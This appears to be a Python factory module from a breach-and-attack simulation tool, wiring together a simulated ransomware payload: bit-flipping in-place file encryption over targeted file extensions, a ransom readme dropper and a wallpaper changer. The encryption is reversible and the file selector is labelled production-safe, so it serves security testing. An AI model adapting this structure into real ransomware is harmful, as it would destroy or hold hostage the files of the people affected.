import logging
from pprint import pformat

from monkeytypes import AgentID, OperatingSystem

from common.event_queue import IAgentEventPublisher

from .bit_manipulators import flip_bits
from .file_selectors import ProductionSafeTargetFileSelector
from .in_place_file_encryptor import InPlaceFileEncryptor
from .internal_ransomware_options import InternalRansomwareOptions
from .ransomware import Ransomware
from .ransomware_options import RansomwareOptions
from .readme_dropper import ReadmeDropper
from .targeted_file_extensions import TARGETED_FILE_EXTENSIONS
from .wallpaper_changer import WallpaperChanger

CHUNK_SIZE = 4096 * 24

logger = logging.getLogger(__name__)


def build_ransomware(
    agent_id: AgentID,
    agent_event_publisher: IAgentEventPublisher,
    options: RansomwareOptions,
    operating_system: OperatingSystem,
):
    logger.debug(f"Ransomware configuration:\n{pformat(options)}")
    internal_ransomware_options = InternalRansomwareOptions(options, operating_system)

    file_encryptor = _build_file_encryptor(internal_ransomware_options.file_extension)
    file_selector = _build_file_selector(internal_ransomware_options.file_extension)
    leave_readme = _build_leave_readme(operating_system)
    change_wallpaper = _build_change_wallpaper(operating_system)

    return Ransomware(
        internal_ransomware_options,
        file_encryptor,
        file_selector,
        leave_readme,
        change_wallpaper,
        agent_event_publisher,
        agent_id,
    )


def _build_file_encryptor(file_extension: str):
    return InPlaceFileEncryptor(
        encrypt_bytes=flip_bits, new_file_extension=file_extension, chunk_size=CHUNK_SIZE
    )


def _build_file_selector(file_extension: str):
    targeted_file_extensions = TARGETED_FILE_EXTENSIONS.copy()
    if file_extension:
        targeted_file_extensions.discard(file_extension)

    return ProductionSafeTargetFileSelector(targeted_file_extensions)


def _build_leave_readme(operating_system: OperatingSystem):
    return ReadmeDropper(operating_system).leave_readme


def _build_change_wallpaper(operating_system: OperatingSystem):
    return WallpaperChanger(operating_system).change_wallpaper
